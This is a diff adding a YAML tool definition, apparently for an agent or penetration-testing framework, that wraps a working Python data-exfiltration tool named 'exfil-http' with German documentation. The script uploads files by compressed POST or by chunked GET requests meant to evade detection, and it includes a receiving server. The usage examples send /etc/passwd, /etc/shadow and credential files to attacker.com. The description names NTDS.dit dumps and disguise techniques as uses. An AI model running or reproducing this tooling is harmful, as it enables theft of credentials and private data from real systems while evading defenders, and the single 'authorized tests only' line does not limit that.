@@ -1,0 +1,176 @@
+name: "exfil-http"
+command: "python3"
+args:
+  - "-c"
+  - |
+    import sys
+    import os
+    import base64
+    import gzip
+    import json
+    import urllib.request
+    import urllib.parse
+    import shlex
+    import subprocess
+
+    if len(sys.argv) < 2:
+        sys.stderr.write("Usage: <mode> [args]\n")
+        sys.exit(1)
+
+    mode = sys.argv[1]
+    args = sys.argv[2:] if len(sys.argv) > 2 else []
+
+    def chunk_data(data, size=1024):
+        for i in range(0, len(data), size):
+            yield data[i:i+size]
+
+    if mode == "send_file":
+        # Exfiltriere Datei via HTTP POST
+        if len(args) < 2:
+            sys.stderr.write("Usage: send_file <filepath> <url>\n")
+            sys.exit(1)
+        filepath, url = args[0], args[1]
+        with open(filepath, 'rb') as f:
+            raw = f.read()
+        compressed = gzip.compress(raw)
+        encoded = base64.b64encode(compressed).decode()
+        payload = json.dumps({
+            "filename": os.path.basename(filepath),
+            "size": len(raw),
+            "data": encoded
+        }).encode()
+        req = urllib.request.Request(url, data=payload,
+            headers={"Content-Type": "application/json",
+                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+        try:
+            with urllib.request.urlopen(req, timeout=30) as resp:
+                sys.stdout.write(f"[+] Exfiltrated {filepath} ({len(raw)} bytes) -> {url}\n")
+                sys.stdout.write(resp.read().decode() + "\n")
+        except Exception as e:
+            sys.stderr.write(f"[-] Error: {e}\n")
+            sys.exit(1)
+
+    elif mode == "send_chunks":
+        # Exfiltriere in Chunks via GET-Parameter (stealthier)
+        if len(args) < 2:
+            sys.stderr.write("Usage: send_chunks <filepath> <base_url>\n")
+            sys.exit(1)
+        filepath, base_url = args[0], args[1]
+        with open(filepath, 'rb') as f:
+            raw = f.read()
+        encoded = base64.b64encode(raw).decode()
+        chunks = list(chunk_data(encoded, 512))
+        fname = urllib.parse.quote(os.path.basename(filepath))
+        for i, chunk in enumerate(chunks):
+            params = urllib.parse.urlencode({
+                "id": fname, "n": i, "t": len(chunks), "d": chunk
+            })
+            url = f"{base_url}?{params}"
+            try:
+                req = urllib.request.Request(url,
+                    headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=15):
+                    pass
+                sys.stdout.write(f"[+] Chunk {i+1}/{len(chunks)} sent\n")
+            except Exception as e:
+                sys.stderr.write(f"[-] Chunk {i} error: {e}\n")
+        sys.stdout.write(f"[+] Done: {len(chunks)} chunks for {filepath}\n")
+
+    elif mode == "server":
+        # Einfacher HTTP-Empfangsserver
+        port = int(args[0]) if args else 8080
+        from http.server import HTTPServer, BaseHTTPRequestHandler
+        class ExfilHandler(BaseHTTPRequestHandler):
+            def do_POST(self):
+                length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(length)
+                try:
+                    data = json.loads(body)
+                    raw = gzip.decompress(base64.b64decode(data['data']))
+                    fname = os.path.basename(data['filename'])
+                    with open(f"/tmp/exfil_{fname}", 'wb') as f:
+                        f.write(raw)
+                    sys.stdout.write(f"[+] Received: /tmp/exfil_{fname} ({len(raw)} bytes)\n")
+                    self.send_response(200)
+                except Exception as e:
+                    sys.stderr.write(f"Error: {e}\n")
+                    self.send_response(500)
+                self.end_headers()
+            def log_message(self, fmt, *a):
+                sys.stdout.write(f"[*] {fmt % a}\n")
+        srv = HTTPServer(("0.0.0.0", port), ExfilHandler)
+        sys.stdout.write(f"[+] Exfil server listening on port {port}\n")
+        srv.serve_forever()
+
+    else:
+        sys.stderr.write(f"Unknown mode: {mode}\n")
+        sys.exit(1)
+enabled: true
+short_description: "HTTP/HTTPS Daten-Exfiltration – Dateien via HTTP POST/GET exfiltrieren"
+description: |
+  Werkzeug zur Daten-Exfiltration über HTTP/HTTPS. Unterstützt verschiedene
+  Exfiltrationsmethoden (POST mit Kompression, GET-Chunks) um Erkennung zu erschweren.
+  Enthält auch einen einfachen Empfangsserver.
+
+  **Betriebsmodi:**
+
+  **1. send_file – Datei via HTTP POST exfiltrieren:**
+  ```bash
+  # Datei komprimiert und base64-kodiert senden
+  exfil-http send_file /etc/passwd http://attacker.com:8080/collect
+  exfil-http send_file /tmp/creds.txt https://attacker.com/upload
+  ```
+
+  **2. send_chunks – Chunked GET-Exfiltration (stealthy):**
+  ```bash
+  # In kleinen Chunks via URL-Parameter senden
+  exfil-http send_chunks /etc/shadow http://attacker.com:8080/img
+  ```
+
+  **3. server – Empfangsserver auf Angreifer-Seite:**
+  ```bash
+  # Server auf Port 8080 starten
+  exfil-http server 8080
+  # Empfangene Dateien werden unter /tmp/exfil_* gespeichert
+  ```
+
+  **Exfiltrations-Szenarien:**
+  - Credential-Dumps (NTDS.dit, /etc/shadow) exfiltrieren
+  - Konfigurationsdateien und Schlüssel übertragen
+  - Netzwerk-Diagramme und interne Dokumente sichern
+  - Datenbank-Dumps übertragen
+
+  **Tarnungs-Techniken:**
+  - Kompression + Base64-Kodierung der Daten
+  - Standard User-Agent Headers
+  - Chunked Transfer zur Tarnung als normaler Web-Traffic
+
+  **Hinweise:**
+  - HTTPS für verschlüsselte Übertragung verwenden
+  - Auf Empfangsserver achten (exfil-http server <port>)
+  - Nur für autorisierte Penetrationstests
+parameters:
+  - name: "mode"
+    type: "string"
+    description: |
+      Betriebsmodus:
+      - `send_file <filepath> <url>` – Datei via POST exfiltrieren
+      - `send_chunks <filepath> <base_url>` – Chunked GET-Exfiltration
+      - `server <port>` – Empfangsserver starten (Standard: 8080)
+    required: true
+    position: 0
+    format: "positional"
+  - name: "target_file"
+    type: "string"
+    description: "Pfad zur zu exfiltrierenden Datei (bei send_file/send_chunks)"
+    required: false
+    default: ""
+    position: 1
+    format: "positional"
+  - name: "url"
+    type: "string"
+    description: "Ziel-URL des Empfangsservers (bei send_file/send_chunks)"
+    required: false
+    default: ""
+    position: 2
+    format: "positional"
